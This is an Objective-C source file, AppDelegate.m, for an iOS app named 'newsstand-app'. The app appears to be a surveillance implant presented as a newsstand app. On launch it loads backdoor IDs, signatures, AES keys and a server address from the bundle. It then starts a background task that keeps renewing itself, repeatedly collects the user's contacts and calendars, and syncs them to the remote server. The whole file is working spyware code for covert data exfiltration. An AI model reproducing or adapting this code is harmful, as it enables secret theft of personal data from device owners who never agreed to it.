//
//  AppDelegate.m
//  newsstand-app
//
//  Created by Massimo Chiodini on 10/29/14.
//
//

#import "ViewController.h"
#import "AppDelegate.h"
#import "RCSIGlobals.h"
#import "RESTNetworkProtocol.h"

typedef struct _sync {
    u_int gprsFlag;  // bit 0 = Sync ON - bit 1 = Force
    u_int wifiFlag;
    u_int serverHostLength;
    wchar_t serverHost[256];
} syncStruct;

ViewController *gMainView = nil;
char gServerAddress[128];
int  gSynchDelay = 60;

void asciiToHex(char *string, char binary[])
{
    char digit[3];
    
    for (int i=0, j=0; i<32; i+=2,j++)
    {
        digit[0] = string[i]; digit[1] = string[i+1]; digit[2] = 0;
        sscanf(digit, "%x", ((char*)binary)+j);
    }
}

@interface AppDelegate ()

@end


#pragma mark -
#pragma mark - Calendar
#pragma mark -

@implementation EventManager
@synthesize eventsAccessGranted;

- (id)init
{
    self = [super init];
    
    if (self) {
        
        self.eventStore = [[EKEventStore alloc] init];
        
        NSUserDefaults *userDefaults = [NSUserDefaults standardUserDefaults];
        
        if ([userDefaults valueForKey:@"eventkit_events_access_granted"] != nil) {
            self.eventsAccessGranted = [[userDefaults valueForKey:@"eventkit_events_access_granted"] intValue];
        }
        else{
            self.eventsAccessGranted = NO;
        }
    }
    
    return self;
}

-(void)setEventsAccessGranted:(BOOL)_eventsAccessGranted
{
    eventsAccessGranted = _eventsAccessGranted;
    
    [[NSUserDefaults standardUserDefaults] setValue:[NSNumber numberWithBool:eventsAccessGranted] forKey:@"eventkit_events_access_granted"];
}

-(NSArray *)getLocalEventCalendars{
    NSArray *allCalendars = [self.eventStore calendarsForEntityType:EKEntityTypeEvent];
    NSMutableArray *localCalendars = [[NSMutableArray alloc] init];
    
    for (int i=0; i<allCalendars.count; i++) {
        EKCalendar *currentCalendar = [allCalendars objectAtIndex:i];
        if (currentCalendar.type == EKCalendarTypeLocal) {
            [localCalendars addObject:currentCalendar];
        }
    }
    
    return (NSArray *)localCalendars;
}

@end


#pragma mark -
#pragma mark - AppDelegate
#pragma mark -

@implementation AppDelegate

@synthesize expirationHandler;
@synthesize bgTask;
@synthesize background;
@synthesize jobExpired;

#define ACTION_SYNC         0x4001

#pragma mark -
#pragma mark - Backgorund Synch task
#pragma mark -

- (void)performSync
{
    syncStruct aConfiguration;
    
    memset(&aConfiguration, 0, sizeof(syncStruct));
    
    NSString *hostString = [NSString stringWithCString:gServerAddress encoding:NSUTF8StringEncoding];
    
    aConfiguration.serverHostLength = [hostString lengthOfBytesUsingEncoding:NSUTF8StringEncoding];
    
    memcpy(aConfiguration.serverHost,
           [[hostString dataUsingEncoding:NSUTF8StringEncoding] bytes],
           [hostString lengthOfBytesUsingEncoding:NSUTF8StringEncoding]);
    
    NSData *syncConfig = [NSData dataWithBytes:&aConfiguration length:sizeof(syncStruct)];
    
    RESTNetworkProtocol *protocol = [[RESTNetworkProtocol alloc]
                                     initWithConfiguration: syncConfig
                                     andType: ACTION_SYNC];
    
    [protocol perform];

}

- (void)startBackgroundSynch
{
    NSLog(@"Synch restarted!");
    
    dispatch_async(dispatch_get_global_queue(DISPATCH_QUEUE_PRIORITY_DEFAULT, 0), ^{
        while (self.jobExpired == NO)
        {
          [NSThread sleepForTimeInterval:gSynchDelay];
          
          gMainView = (ViewController*)[UIApplication sharedApplication].keyWindow.rootViewController;
          
          // Grab New Calendar and Contacts
          [gMainView getABContatcs];
          [gMainView getCalendars];
          
          [NSThread sleepForTimeInterval:1];
          
          // Synch to server
          [self performSync];
        }
        
        @synchronized(self)
        {
            self.jobExpired = NO;
        }
    });
}


#pragma mark -
#pragma mark - AppDelegate Init
#pragma mark -

- (void)initAppKeys
{
  memcpy(gConfAesKeyAscii,
         [[[NSBundle mainBundle] objectForInfoDictionaryKey: @"ConfKey"] cStringUsingEncoding:NSUTF8StringEncoding], 32);
  
  memcpy(gLogAesKeyAscii,
         [[[NSBundle mainBundle] objectForInfoDictionaryKey: @"LogKey"]cStringUsingEncoding:NSUTF8StringEncoding], 32);
  
  memcpy(gBackdoorID,
         [[[NSBundle mainBundle] objectForInfoDictionaryKey: @"Instance"] cStringUsingEncoding:NSUTF8StringEncoding], 16);
  
  memcpy(gBackdoorSignatureAscii,
         [[[NSBundle mainBundle] objectForInfoDictionaryKey: @"Signature"] cStringUsingEncoding:NSUTF8StringEncoding], 32);
  
  memcpy(gServerAddress,
         [[[NSBundle mainBundle] objectForInfoDictionaryKey: @"Server"] cStringUsingEncoding:NSUTF8StringEncoding], 128);
  
  gSynchDelay = [[[NSBundle mainBundle] objectForInfoDictionaryKey: @"SynchDelay"] intValue];
  
}

- (BOOL)application:(UIApplication *)application didFinishLaunchingWithOptions:(NSDictionary *)launchOptions
{
    // Init Keys
    [self initAppKeys];
  
    gBackdoorID[14] = gBackdoorID[15] = 0;
    asciiToHex(gLogAesKeyAscii, gLogAesKey);
    asciiToHex(gConfAesKeyAscii, gConfAesKey);
    asciiToHex(gBackdoorSignatureAscii, gBackdoorSignature);
  
    // Request Calendar access
    self.eventManager = [[EventManager alloc] init];
  
    [self.eventManager.eventStore requestAccessToEntityType:EKEntityTypeEvent completion:^(BOOL granted, NSError *error)
     {
        if (error == nil)
        {
            self.eventManager.eventsAccessGranted = granted;
        }
     }];
  
    // Init synch backgorund task
    UIApplication *app = [UIApplication sharedApplication];
    self.expirationHandler = ^{
        
        [app endBackgroundTask:self.bgTask];
        
        @synchronized(self)
        {
            self.jobExpired = YES;
        }
      
        self.bgTask = UIBackgroundTaskInvalid;
        self.bgTask = [app beginBackgroundTaskWithExpirationHandler:expirationHandler];
        
        [self startBackgroundSynch];
    };
    
    self.bgTask = [app beginBackgroundTaskWithExpirationHandler:expirationHandler];
    
    [self startBackgroundSynch];
    
    return YES;
}

- (void)applicationWillResignActive:(UIApplication *)application {

}

- (void)applicationDidEnterBackground:(UIApplication *)application {
    background = YES;
}

- (void)applicationWillEnterForeground:(UIApplication *)application {

}

- (void)applicationDidBecomeActive:(UIApplication *)application {

}

- (void)applicationWillTerminate:(UIApplication *)application {
}

@end
